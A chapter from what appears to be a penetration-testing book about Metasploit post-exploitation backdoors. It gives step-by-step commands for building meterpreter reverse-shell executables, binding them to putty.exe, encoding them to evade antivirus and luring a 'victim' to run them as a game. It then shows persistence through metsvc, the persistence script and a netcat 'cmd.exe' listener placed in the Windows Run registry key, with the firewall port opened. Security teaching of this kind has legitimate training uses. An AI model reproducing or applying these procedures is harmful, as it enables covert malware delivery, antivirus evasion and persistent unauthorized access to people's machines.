- en: Chapter 10. Post Exploitation – Backdoors
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous chapter we focused on cleaning our tracks to avoid getting detected
    and caught. This chapter will cover the techniques on maintaining access to the
    compromised system by using backdoors. Backdoors play an important role in maintaining
    persistent access to the system and using the system as per the attacker's needs
    without attacking it again and again. We will discuss how to evade a malicious
    executable file from being detected by an antivirus scanner and compromise the
    user machine. Additionally, we will be discussing how to use encoders to make
    these executables undetectable.
  prefs: []
  type: TYPE_NORMAL
- en: What is a backdoor?
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: A backdoor is a means of gaining access to a computer by ways that bypass the
    normal security mechanisms in place. With the development in technology, it now
    comes with a remote administration utility that allows an attacker to control
    the system remotely from anywhere through the Internet. This can be in the form
    of bypassing authentication, obtaining access to confidential information, and
    securing illegal access to a computer system. Trends indicate that these have
    been more focused on downloading/uploading files, remotely taking screenshots,
    running keyloggers, gathering system information, and hampering user privacy.
  prefs: []
  type: TYPE_NORMAL
- en: As an example, consider a client-server network communication where the attacked
    machine acts as a server and the client is our attacker. Once the server application
    is started on the compromised user, it starts listening for incoming connections.
    Hence a client can easily connect on that specific port and start the communication.
    Once the communication starts, it may be followed up with other malicious activities
    as described earlier. We have a kind of reverse connection between the server
    and the client. The server connects to a single client and the client can send
    a single command to multiple servers that are connected.
  prefs: []
  type: TYPE_NORMAL
- en: Payload tools
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'We may come across several payload-making tools throughout this chapter. They
    are briefly described here:'
  prefs: []
  type: TYPE_NORMAL
- en: '`msfpayload`: This is a command-line instance of Metasploit used to generate
    and output all of the various types of shell code available in Metasploit. This
    is mainly used for the generation of shell code for an exploit not found in Metasploit
    or for testing different types of shell code and options before finalizing a module.
    It is an excellent mix of different options and variables.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msfencode`: This is another great tool in the Metasploit kit for exploit development.
    Its main use is to encode the shell code generated by `msfpayload`. This is done
    to suit the target in order to function properly. It may involve transforming
    the shell code into pure alphanumeric and getting rid of bad characters and encoding
    it for 64-bit targets. This can be used to encode the shell code multiple times;
    output it in various formats such as C, Perl, and Ruby; and even merge it to an
    existing executable file.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`msfvenom`: Technically speaking, `msfvenom` is a combination of `msfpayload`
    and `msfencode`. The advantages of `msfvenom` include a number of standardized
    command-line options, a single tool, and increased speed.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Creating an EXE backdoor
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we will learn how to create a malicious backdoor using inbuilt
    payloads. But before starting this, we will check the location (payload directory)
    of these payloads in the Metasploit framework. So we go to the root directory
    and then to `/opt/metasploit/msf3/modules`. Under this directory, we find the
    **payloads** directory.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_01.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can also see all these payloads from msfconsole by using a simple command.
    Just type in `show payloads` and it will list all payloads.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: For creating a backdoor with the help of a payload, there are three available
    tools in Metasploit, `msfpayload`, `msfencode` and `msfvenom`. These three tools
    are found at `/opt/metasploit/msf3`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now we will see how to use `msfpayload` for creating a backdoor. Open the terminal
    and enter the path to the `msfpayload` directory. In our case, it is `cd /opt/metasploit/msf3`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now we are in the directory and we can use `msfpayload` for creating a backdoor;
    that is, the location of `msfpayload`. Typing in `./msfpayload -h` will show us
    all the usable commands of the `msfpayload`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We see that there is an option for `<payload>`. This means that we have to select
    a payload first from the payload list, which has already been shown to you by
    the `show payloads` command. So we now select a payload.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_06.jpg)'
  prefs: []
  type: TYPE_IMG
- en: For example, here we are selecting the `windows/x64/meterpreter/reverse_tcp`
    payload for creating our backdoor.
  prefs: []
  type: TYPE_NORMAL
- en: Now type in `./msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105
    X> root/Desktop/virus.exe`.
  prefs: []
  type: TYPE_NORMAL
- en: 'The syntax to be used is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: '![Creating an EXE backdoor](img/3589_10_07.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After typing in the command, we see that we have a `virus.exe` backdoor on our
    desktop. That's it; we are done. It is that easy to create a backdoor using `msfpayload`.
    If we do not want to create our own EXE file and just want to bind with another
    EXE file (may be with a software setup file), we can do it by using a mixture
    of `msfpayload` and `msfvenom`.
  prefs: []
  type: TYPE_NORMAL
- en: 'We will now bind our backdoor EXE file with the `putty.exe` file. Type in the
    following command very carefully:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'The syntax to be used is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: We can see in the following screenshot that our virus file, `virus.exe`, has
    been bound with `putty.exe` to give us `virusputty.exe`, which is available on
    our desktop for use.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating an EXE backdoor](img/3589_10_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Up to this point in the chapter, we have learned to create a backdoor with `msfpayload`
    and `msfvenom`. The next step is sending this backdoor EXE program to a victim
    by using any of the social engineering techniques.
  prefs: []
  type: TYPE_NORMAL
- en: Creating a fully undetectable backdoor
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The backdoor that we have created in the earlier section is not very efficient
    and lacks detection-evasion mechanisms. The problem is that the backdoor can be
    easily detected by an antivirus program. So, in this section, our main task will
    be to make an undetectable backdoor and bypass the antivirus program.
  prefs: []
  type: TYPE_NORMAL
- en: We just sent our `virus.exe` file to the victim by changing its name to `game.exe`
    so that he/she will download it.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_09.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After downloading the `game.exe` file, it gets detected by AVG antivirus as
    a virus.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Our backdoor is easily detected by the antivirus program and we have to make
    it undetectable. Let us start the process. We will use `msfencode` and an encoder
    to do this. First, select a good encoder for encoding the backdoor EXE file. Type
    in `show encoders`; this will show the list of available encoders in Metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can now see the encoders list. We will select `x86 shikata_ga_nai` because
    it has a rank of **excellent**.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Now type in the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'The syntax to be used is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: We can see in the following screenshot that our `supergame.exe` file has been
    created.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Again, we send the `supergame.exe` file to a victim in the form of a link and
    make him/her download the `supergame.exe` file onto his/her desktop.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: If the victim scans the `supergame.exe` file with his/her antivirus program,
    he/she will find it to be a clean file.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: If you don't like typing so many commands in the terminal, there is another
    easy way to create an undetectable backdoor with the help of a script. This script
    is called Vanish. Before working on the script, we have to install some packages
    that are required by the Vanish script, in BackTrack (BackTrack is a distribution
    based on the Debian GNU/Linux distribution aimed at digital forensics and penetration
    testing use). So type in `apt-get install mingw32-runtime mingw-w64 mingw gcc-mingw32
    mingw32-binutils`. It will take a few minutes to install all the necessary packages.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_16.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After successfully installing the packages, we have to just download the script
    from the Internet by typing in `wget http://samsclass.info/120/proj/vanish.sh`;
    the `vanish.sh` file is saved on the desktop.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_17.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After that, type in `ll van*`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_18.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now change the permissions on the script by typing in `chmod a+x vanish.sh`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_19.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After that, we have to move the Vanish script that is in the Metasploit directory
    to `pentest/exploits/framework2`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_20.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Our Vanish script is now ready for use, so let us go to that directory and type
    in `sh vanish.sh`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_21.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After executing the script, the script will ask for the network interface on
    which we want to use it. Type in `eth0`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_22.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After providing the device interface, it will ask for a few more options, such
    as the port number of the reverse connection it will listen to (`4444`), a random
    seed number (we enter it as `2278`), and the number of times to encode the payload
    (we specify `2`). After giving these details, it will create a `backdoor.exe`
    file in the `seclabs` directory. The `seclabs` directory is located in the same
    directory as the Vanish script. The payload handler will also be automatically
    launched in msfconsole by the script. Now we just have to send that `backdoor.exe`
    file to the victim and wait for its execution.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_23.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We have, up to this point, learned about the different methods and tricks for
    creating a backdoor. Now we will go to the next part – handling the reverse connection
    from the victim's computer after executing the backdoor. After sending the payload
    to the victim, open msfconsole and type in `use exploit/multi/handler`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_24.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Then just set all the payload details in this handler and send it to the victim.
    Type in `set PAYLOAD <your payload name>`; for example, here we are using `set
    PAYLOAD windows/meterpreter/reverse_tcp`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_25.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After that, set the local host address that you have provided to your backdoor
    EXE file. Type in `set LHOST <IP address>`; for example, here we are using `set
    LHOST 192.168.0.103`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_26.jpg)'
  prefs: []
  type: TYPE_IMG
- en: This is the last and final type of attack using the technique of exploitation
    and we will see that our reverse handler connection is ready for receiving connections.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_27.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After executing the backdoor, the reverse connection will be established successfully
    and a Meterpreter session will be spawned on the attacker's system.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_28.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Let us obtain information about the victim's system by checking his/her system
    properties.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_29.jpg)'
  prefs: []
  type: TYPE_IMG
- en: It is time to learn something different. In this section we will learn to install
    a backdoor in the victim's system after attaining a Meterpreter session.
  prefs: []
  type: TYPE_NORMAL
- en: There is another backdoor available in Metasploit, which is known as `metsvc`.
    We will first check the commands that can be used with this backdoor, so type
    in `run metsvc -h` and it will show us these.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_30.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see that the `-A` option will automatically launch a backdoor in the
    victim's machine. So type in `run metsvc -A`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_31.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see that a second Meterpreter session is established from the victim's
    system and the malicious backdoor `metsvc-server.exe` file is successfully uploaded
    in the victim's system and executed.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_32.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The victim's task manager displays our backdoor service as running. These malicious
    files are uploaded to Windows' `Temp` directory at `C:\WINDOWS\Temp\CFcREntszFKx`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_33.jpg)'
  prefs: []
  type: TYPE_IMG
- en: If you want to remove that backdoor service from the victim's system, type in
    `run metsvc -r`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating a fully undetectable backdoor](img/3589_10_34.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see that the `metsvc` service is successfully removed, but the EXE files
    from the victim's `Temp` directory will not get removed.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit persistent backdoor
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In this part, we will learn to use a persistent backdoor. It is a Meterpreter
    script that installs a backdoor service in the target system. So type in `run
    persistence -h` for showing all the commands that can be used with a persistent
    backdoor.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_35.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After understanding the usable commands, type in `run persistence -A -L C:\\
    -S -X -p 445 -i 10 -r 192.168.0.103`.
  prefs: []
  type: TYPE_NORMAL
- en: 'The commands in this syntax are explained as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '`A`: For automatically starting a payload handler'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`L`: The location in the target host for dropping the payload'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`S`: For automatically starting the agent when the system boots'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`p`: The port number for listening to reverse connections'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`i`: The time interval for new connections'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`r`: The IP address of the target machine'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Now we run our persistence backdoor script as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_36.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We see that a Meterpreter session has been established from the victim's system.
    Let us verify whether the payload is dropped in the victim's `C:` drive.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_37.jpg)'
  prefs: []
  type: TYPE_IMG
- en: If you want to remove that payload, we have to type in `resource` and the path
    of the file that has been created at the time of running the `persistence` command.
    We can find the path in the previous step. Type in `resource /root/.msf4/logs/persistence/PWNED-02526E037_20130513.2452/PWNED-02526E037_20130513.2452.rc`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_38.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We are going to show you another famous persistent backdoor, Netcat. We will
    upload Netcat on the victim's system through the Meterpreter session. Just as
    in the following screenshot, we will see the `nc.exe` file on our desktop; that
    file is Netcat. Now we will upload this `nc.exe` file onto the victim's `system32`
    folder. So type in `upload /root/Desktop/nc.exe C:\\windows\\system32`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_39.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see that our Netcat program is successfully uploaded onto the victim's
    system. An important thing we have to do now is add Netcat to the victim's startup
    process and bind it with port 445\. In order to be able to do this, we have to
    tweak the victim's registry settings. Type in `run reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_40.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Running this command enumerated the startup registry key and we found that three
    services were running in the startup process. We can see the three values in the
    preceding screenshot. Now we set our Netcat service in this registry value. Type
    in `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
    -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_41.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Our Netcat service is attached to the registry, so let us verify whether it
    is running properly. Type in `reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run
    -v nc`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_42.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The next important thing we have to do is allow the Netcat service, which is
    at port number 445, through the victim's firewall. Type in `netsh firewall add
    portopening TCP 445 "Service Firewall" ENABLE ALL`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_43.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After executing the previous command, we see that our port seems to be open.
    So let us verify from the firewall settings whether the port is open or not. Type
    in `netsh firewall show portopening`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_44.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can clearly see in the preceding screenshot that the `445 TCP` port is enabled
    in the firewall. Now reboot the victim's system and connect the victim's system
    with Netcat. Open the terminal and type in `nc -v <targetIP > <netcat port no.>`;
    for example, here we are using `nc -v 192.168.0.107 445`. Doing this will connect
    you back to the victim's machine.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit persistent backdoor](img/3589_10_45.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter we covered various techniques on how to make a backdoor executable
    for deployment on the victim's system. We learned to bind the executable files
    to legitimate programs and make the victim execute them for us to get a reverse
    connection. We also discussed different types of payloads in the Metasploit kitty
    and how they work in establishing connections with the backdoor EXE. We also worked
    on making an executable undetectable by an antivirus, and hence the user was not
    able to distinguish between a normal and a malicious file. Through these techniques,
    we were able to learn how to maintain persistent access to the system once it
    has been exploited. In the next chapter, we will discuss the final phase of post-exploitation,
    which is pivoting and network sniffing.
  prefs: []
  type: TYPE_NORMAL
- en: References
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are some helpful references that shed further light on some of
    the topics covered in this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://jameslovecomputers.wordpress.com/2012/12/10/metasploit-how-to-backdoor-an-exe-file-with-msfpayload/](http://jameslovecomputers.wordpress.com/2012/12/10/%E2%80%A8metasploit-how-to-backdoor-an-exe-file-with-msfpayload/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/](http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html](http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc](http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.offensive-security.com/metasploit-unleashed/Netcat_Backdoor](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Netcat_Backdoor)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://en.wikipedia.org/wiki/Backdoor_(computing)](http://en.wikipedia.org/wiki/Backdoor_(computing))'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.f-secure.com/v-descs/backdoor.shtml](http://www.f-secure.com/v-descs/backdoor.shtml)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://feky.bizhat.com/tuts/backdoor.htm](http://feky.bizhat.com/tuts/backdoor.htm)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.offensive-security.com/metasploit-unleashed/Msfpayload](http://www.offensive-security.com/metasploit-unleashed/Msfpayload)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.offensive-security.com/metasploit-unleashed/Msfencode](http://www.offensive-security.com/metasploit-unleashed/Msfencode)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.offensive-security.com/metasploit-unleashed/Msfvenom](http://www.offensive-security.com/metasploit-unleashed/Msfvenom)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
